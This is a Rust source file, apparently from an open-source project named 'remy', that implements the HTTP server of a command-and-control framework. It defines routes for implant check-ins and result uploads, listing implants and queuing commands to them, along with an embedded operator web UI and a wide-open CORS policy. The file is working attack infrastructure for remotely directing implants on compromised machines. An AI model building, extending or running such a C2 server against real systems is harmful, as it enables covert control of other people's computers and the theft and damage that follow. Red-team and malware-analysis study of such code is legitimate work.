/*
// Author: Aliasgar Khimani (NovusEdge)
// Project: github.com/ARaChn3/remy
//
// Copyright: MIT License
// See the LICENSE file for more info.
*/

//! HTTP server for the C2.
//!
//! Uses Axum to provide:
//! - REST API endpoints for implant communication
//! - Static file serving for the web UI
//! - CORS support for frontend development

use axum::{
    routing::{get, post},
    Router,
};
use std::net::SocketAddr;
use tower_http::cors::{Any, CorsLayer};
use tracing::info;

use super::api;
use super::embed;
use super::sessions::SharedSessions;

/// Configuration for the HTTP server.
#[derive(Debug, Clone)]
pub struct ServerConfig {
    /// Address to bind to (e.g., "0.0.0.0:8080")
    pub bind_addr: SocketAddr,

    /// Whether to serve the web UI
    pub serve_ui: bool,

    /// Default sleep interval for implants (seconds)
    pub sleep_interval: u64,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            bind_addr: "0.0.0.0:8080".parse().unwrap(),
            serve_ui: true,
            sleep_interval: 30,
        }
    }
}

/// Starts the C2 HTTP server.
///
/// This is the main entry point for the server. It sets up all
/// routes and begins listening for connections.
///
/// # Arguments
/// * `config` - Server configuration
/// * `sessions` - Shared session manager
///
/// # Example
/// ```no_run
/// let sessions = SessionManager::shared();
/// let config = ServerConfig::default();
/// start_server(config, sessions).await?;
/// ```
pub async fn start_server(
    config: ServerConfig,
    sessions: SharedSessions,
) -> Result<(), Box<dyn std::error::Error>> {
    // Build the API routes
    let api_routes = Router::new()
        .route("/checkin", post(api::handle_checkin))
        .route("/result", post(api::handle_result))
        .route("/implants", get(api::list_implants))
        .route("/implants/:id", get(api::get_implant))
        .route("/implants/:id/command", post(api::queue_command))
        .route("/results/:id", get(api::get_result))
        .with_state(sessions.clone());

    // Build the main router
    let mut app = Router::new().nest("/api", api_routes);

    // Add web UI if enabled
    if config.serve_ui {
        // Serve embedded frontend files
        app = app.fallback(get(embed::static_handler));
    }

    // Add CORS for development
    let cors = CorsLayer::new()
        .allow_origin(Any)
        .allow_methods(Any)
        .allow_headers(Any);

    let app = app.layer(cors);

    info!("Starting C2 server on {}", config.bind_addr);
    info!("API available at http://{}/api", config.bind_addr);

    if config.serve_ui {
        info!("Web UI available at http://{}", config.bind_addr);
    }

    // Start the server
    let listener = tokio::net::TcpListener::bind(config.bind_addr).await?;
    axum::serve(listener, app).await?;

    Ok(())
}
